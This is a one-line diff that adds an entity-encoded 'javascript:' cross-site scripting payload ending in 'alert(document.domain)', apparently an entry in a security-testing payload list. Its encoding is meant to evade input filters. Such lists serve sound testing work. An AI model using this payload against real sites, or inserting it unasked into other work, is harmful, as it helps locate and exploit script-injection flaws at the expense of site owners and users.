@@ -1,0 +1,1 @@
+&#02java&#115cript:alert(document.domain)
